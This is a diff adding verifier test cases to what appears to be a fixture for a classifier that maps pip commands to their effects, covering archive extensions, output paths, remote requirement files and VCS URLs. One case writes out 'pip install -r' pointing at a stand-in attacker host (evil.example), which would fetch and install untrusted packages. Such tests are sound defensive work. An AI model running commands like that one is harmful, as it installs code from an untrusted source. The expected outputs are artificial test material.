@@ -976,3 +976,102 @@ argv = ["pip", "download", "x", "--proxy=http://p.example:8080"]
 action = "download"
 fields = { proxy = "http://p.example:8080", spec = ["x"] }
 effects = ["network", "override_proxy", "run_build_backend"]
+
+# --- independent verifier cases, round 2 ---
+# Written by the verifier against grammar 2fd3d82, from pip 26.3 source (tag 26.3).
+
+# utils/filetypes.py::ARCHIVE_EXTENSIONS also holds .tar, .tbz, .txz, .tlz, .tar.lz, .tar.lzma, and
+# is_archive_file lower-cases the extension. The grammar's own rule says an archive adds
+# override_index.
+[[case]]
+argv = ["pip", "install", "./dist/pkg-1.0.tar"]
+action = "install"
+fields = { spec = ["./dist/pkg-1.0.tar"] }
+effects = ["install_packages", "network", "override_index", "run_build_backend"]
+
+[[case]]
+argv = ["pip", "install", "./dist/pkg-1.0.Tar.Gz"]
+action = "install"
+fields = { spec = ["./dist/pkg-1.0.Tar.Gz"] }
+effects = ["install_packages", "network", "override_index", "run_build_backend"]
+
+# `--report` is a store option: given twice it is not modeled, so `-` cannot cancel a real path.
+[[case]]
+argv = ["pip", "install", "--report=-", "--report", "out.json", "x"]
+action = "unmodeled"
+
+# lock.py compares output_file == "-": only the exact `-` is stdout.
+[[case]]
+argv = ["pip", "lock", "--output=-", "x"]
+action = "lock"
+fields = { output = "-", spec = ["x"] }
+effects = ["network", "run_build_backend"]
+
+[[case]]
+argv = ["pip", "lock", "-o", "./-", "x"]
+action = "lock"
+fields = { output = "./-", spec = ["x"] }
+effects = ["network", "run_build_backend", "write_file"]
+
+[[case]]
+argv = ["pip", "lock", "-o=-", "x"]
+action = "unmodeled"
+
+# `download -d -` makes a directory named `-`; there is no stdout form, so write_file stays.
+[[case]]
+argv = ["pip", "download", "-d", "-", "x"]
+action = "download"
+fields = { dest = "-", spec = ["x"] }
+effects = ["network", "run_build_backend", "write_file"]
+
+# The dry-run removes do not touch write_file or opaque_input.
+[[case]]
+argv = ["pip", "install", "--dry-run", "--report", "r.json", "-r", "req.txt", "x"]
+action = "install"
+fields = { dry_run = true, report = "r.json", requirement = ["req.txt"], spec = ["x"] }
+effects = ["network", "opaque_input", "run_build_backend", "write_file"]
+
+# A remote requirements file (req_file.py::get_file_content fetches a URL).
+[[case]]
+argv = ["pip", "install", "-r", "https://evil.example/req.txt"]
+action = "install"
+fields = { requirement = ["https://evil.example/req.txt"] }
+effects = ["install_packages", "network", "opaque_input", "run_build_backend"]
+
+[[case]]
+argv = ["pip", "install", "--group", "pyproject.toml:dev"]
+action = "install"
+fields = { group = ["pyproject.toml:dev"] }
+effects = ["install_packages", "network", "opaque_input", "run_build_backend"]
+
+[[case]]
+argv = ["pip", "install", "svn+ssh://h.example/r#egg=pkg"]
+action = "install"
+fields = { spec = ["svn+ssh://h.example/r#egg=pkg"] }
+effects = ["install_packages", "network", "override_index", "run_build_backend", "run_vcs"]
+
+# A local version label has `+` and no `:`: no run_vcs.
+[[case]]
+argv = ["pip", "install", "torch==2.4.0+cpu", "--no-deps"]
+action = "install"
+fields = { spec = ["torch==2.4.0+cpu"], no_deps = true }
+effects = ["install_packages", "network", "run_build_backend"]
+
+[[case]]
+argv = ["pip", "wheel", "--wheel-dir=out", "x"]
+action = "wheel"
+fields = { wheel_dir = "out", spec = ["x"] }
+effects = ["network", "run_build_backend", "write_file"]
+
+# A local project: neither source effect (README "Package sources are matched by pattern").
+[[case]]
+argv = ["pip", "install", "-e", "."]
+action = "install"
+fields = { editable = ["."] }
+effects = ["install_packages", "network", "run_build_backend"]
+
+[[case]]
+argv = ["pip", "uninstall", "--requirement=req.txt"]
+action = "uninstall"
+fields = { requirement = ["req.txt"] }
+effects = ["opaque_input", "remove_packages"]
